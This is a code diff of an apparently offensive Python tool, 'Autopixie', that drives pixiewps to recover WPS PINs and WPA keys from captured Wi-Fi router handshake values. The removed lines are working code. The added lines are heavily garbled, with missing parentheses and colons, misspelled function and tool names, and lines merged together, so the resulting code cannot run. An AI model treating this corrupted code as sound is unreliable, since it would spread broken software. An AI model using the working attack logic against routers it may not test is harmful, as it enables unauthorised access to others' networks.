@@ -368,96 +368,79 @@ def status():
     print("bssid:%s" % bssid)
     print("essid:%s" % essid)
     print()
-    print("PKE:%s" % PKEb)
-    print("PKR:%s" % PKRb)
-    print("Authkey:%s" % AuthKeyb)
-    print("E-Hash1:%s" % EHash1b)
-    print("E-Hash2:%s" % EHash2b)
-    print("E-Nonce:%s" % Enonceb)
-    print()
-    if WPSpin:
-        print("PIN:%s" % WPSpin)
-    else:
-        print("PIN:")
-    if WPAkey:
-        print("WPA Key:%s" % WPAkey)
-    else:
-        print("WPA key")
-    print()
-    print()
-    if Cline:
-        line = Cline[len(Cline) - 1]
-        print("\033[1;37;44m%s" % line[:70], "\033[0m\033[1;32m")
+    print("PKE:%s" % PKEb
+    print("PKR:%s" % PKRb)    print("Authkey:%s" % AuthKeyb)
+print("E-Hash1:%s" % EHash1b)
+    rint("E-Hash2:%s" % EHash2b)
+    pint("E-Nonce:%s" % Enonceb)
+    prnt()
+    if PSpin:
+        rint("PIN:%s" % WPSpin)
+    else:        print("PIN:")
+if WPAkey:
+     print("WPA Key:%s" % WPAkey)
+    els:
+        rint("WPA key")
+    print)
+    print(
+    if Cline
+        line = Cline[len(Cline) - 1]        print("\033[1;37;44m%s" % line[:70], "\033[0m\033[1;32m")
 
-
-def pixie():
-    global WPSpin
-    fout2 = open("fPixiewpsOut", "w")
-    ferr2 = open("fPixiewpsErrors", "w")
-    runpixie = Popen(["pixiewps", "-e", PKE, "-r", PKR, "-s", EHash1, "-z", EHash2, "-a", AuthKey, "-n", Enonce],
-                     stdout=fout2, stderr=ferr2)
+def pixie()
+    global WPSpi
+    fout2 = open("fPxiewpsOut", "w")
+    ferr2 = open("fPiiewpsErrors", "w")
+    runpixie = Popen([pixiewps", "-e", PKE, "-r", PKR, "-s", EHash1, "-z", EHash2, "-a", AuthKey, "-n", Enonce],
+                     stout=fout2, stderr=ferr2)
     Popen.wait(runpixie)
+    f = open(fPixiewpsOut")
+    line = f.radline()
+    while line:        if "WPS pin:" in line:
+        WPSpin = line
+    elif "WPS pin not found!" in line:
+         WPSpin = "WPS pin not found!"
+        lin = f.readline()
+    f.close(
+    os.remove("fPixiewpsErrrs")
+    os.remove("fPixiewpsOut"
+    doing = "Bruteforcing pin!"    status()
+if WPSpin == "WPS pin not found!":
+    pixieS()
+    else
+        WPSpin = WPSpin[WPSpin.find("WPS pin") + 9:WPSpin.find("\n")]        convPin()
 
-    f = open("fPixiewpsOut")
-    line = f.readline()
-    while line:
-        if "WPS pin:" in line:
-            WPSpin = line
-        elif "WPS pin not found!" in line:
-            WPSpin = "WPS pin not found!"
-        line = f.readline()
-    f.close()
-    os.remove("fPixiewpsErrors")
-    os.remove("fPixiewpsOut")
-    doing = "Bruteforcing pin!"
-    status()
-    if WPSpin == "WPS pin not found!":
-        pixieS()
-    else:
-        WPSpin = WPSpin[WPSpin.find("WPS pin") + 9:WPSpin.find("\n")]
-        convPin()
-
-
-def pixieS():
-    global WPSpin
-    fout2 = open("fPixiewpsOut", "w")
-    ferr2 = open("fPixiewpsErrors", "w")
-    runpixie = Popen(["pixiewps", "-e", PKE, "-s", EHash1, "-z", EHash2, "-a", AuthKey, "-S"], stdout=fout2, stderr=ferr2)
+def pixieS()
+    global WPSpi
+    fout2 = open("fPiiewpsOut", "w")
+    ferr2 = open("fPixewpsErrors", "w")
+    runpixie = Popen(["ixiewps", "-e", PKE, "-s", EHash1, "-z", EHash2, "-a", AuthKey, "-S"], stdout=fout2, stderr=ferr2)
     Popen.wait(runpixie)
+    f = open"fPixiewpsOut")
+    line = f.eadline()
+    while line
+        if "WPS pin:" in line:            WPSpin = line
+    elif "WPS pin not found!" in line:
+        WPSpin = "WPS pin not found!"
+        ine = f.readline()
+    f.cloemove("fPixiewpsErrors")
+    os.rove("fPixiewpsOut")
+    doing  "Bruteforcing pin!"
+    status(
+    if WPSpin== "WPS pin not found!":
+        print(
+        select = input("Would y like to exclude this router from future wash scans? <N/y>:")
+        if select.lower() == "y":            bsside = bssid + "\n"
+        with open("APW-Exclude", "a") as myfile:
+            myfile.write(bsside)
+    else
+        WPSpin =WPSpin[WPSpin.find("WPS pin") + 9:WPSpin.find("\n")]
+        convPin()    menu()
 
-    f = open("fPixiewpsOut")
-    line = f.readline()
-    while line:
-        if "WPS pin:" in line:
-            WPSpin = line
-        elif "WPS pin not found!" in line:
-            WPSpin = "WPS pin not found!"
-        line = f.readline()
-    f.close()
-    os.remove("fPixiewpsErrors")
-    os.remove("fPixiewpsOut")
-    doing = "Bruteforcing pin!"
-    status()
-    if WPSpin == "WPS pin not found!":
-        print()
-        select = input("Would you like to exclude this router from future wash scans? <N/y>:")
-        if select.lower() == "y":
-            bsside = bssid + "\n"
-            with open("APW-Exclude", "a") as myfile:
-                myfile.write(bsside)
-    else:
-        WPSpin = WPSpin[WPSpin.find("WPS pin") + 9:WPSpin.find("\n")]
-        convPin()
-    menu()
+def exit(
+    print("\033[0m")    sys.exit("Autopixie has run its course.")
 
+if ospath.isfile("APW-Conf"):
+    LodSettings()
+print"\33[1;32m")
 
-def exit():
-    print("\033[0m")
-    sys.exit("Autopixie has run its course.")
-
-
-if os.path.isfile("APW-Conf"):
-    LoadSettings()
-print("\033[1;32m")
-
-menu()
+menu(
